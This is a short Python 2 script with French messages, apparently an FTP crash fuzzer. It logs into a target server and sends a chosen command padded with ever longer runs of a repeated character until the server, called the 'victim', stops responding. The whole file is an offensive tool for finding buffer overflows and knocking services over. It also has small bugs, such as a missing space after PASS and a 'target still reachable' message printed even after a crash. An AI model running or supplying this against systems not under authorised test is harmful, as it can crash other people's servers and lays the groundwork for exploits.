import socket
import sys
if len(sys.argv) != 6:

    print "Utilisation - ./Fuzzer.py [IP] [PORT] [PAYLOAD] [INTERVAL] [MAXIMUM]"
    sys.exit()



target = str (sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
interval = int(sys.argv[4])
i = int(sys.argv[4])
max = int(sys.argv[5])

user = raw_input("Entrer le login : ")
passwd = raw_input("Entrer le password  : ")
command = raw_input("Entrer la commande a fuzzer : ")

while i <= max:
    try:
        payload = command + " " + (char * i)
        print "Envoi : " + str(i) + "Instances du payload : " + char + "   (A) destination de la victime"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect = s.connect((target,port))
        s.recv(1024)
        s.send('USER ' + user + '\r\n')
        s.recv(1024)
        s.send('PASS' + passwd + '\r\n')
        s.recv(1024)
        s.send(payload + '\r\n')
        s.send('QUIT \r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except :
        print "L'envoi ne marche plus .. Le serveur a peut etre crashe "

    print "Aucune information... La cible est toujours accessible :) "